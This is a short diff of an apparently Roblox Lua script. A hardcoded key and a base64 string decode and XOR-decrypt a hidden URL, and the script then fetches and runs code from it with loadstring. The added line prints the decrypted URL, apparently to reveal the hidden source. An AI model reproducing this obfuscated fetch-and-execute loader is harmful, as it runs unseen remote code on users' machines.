@@ -42,4 +42,5 @@ local key = "key22052009"
 local encoded = "AxENQkEKGh1CUU5FAhBGWkVXR0NVSwgKF0ZXXkEcU19URCYYUVPFW1teVRYvLTUdQFVTQR9YXAoBCh1fUVxcH3xWCEQXFUeWUdR"
 local encrypted = Base64Decode(encoded)
 local url = XOR(encrypted,key)
+print(url)
 loadstring(game:HttpGet(url))()
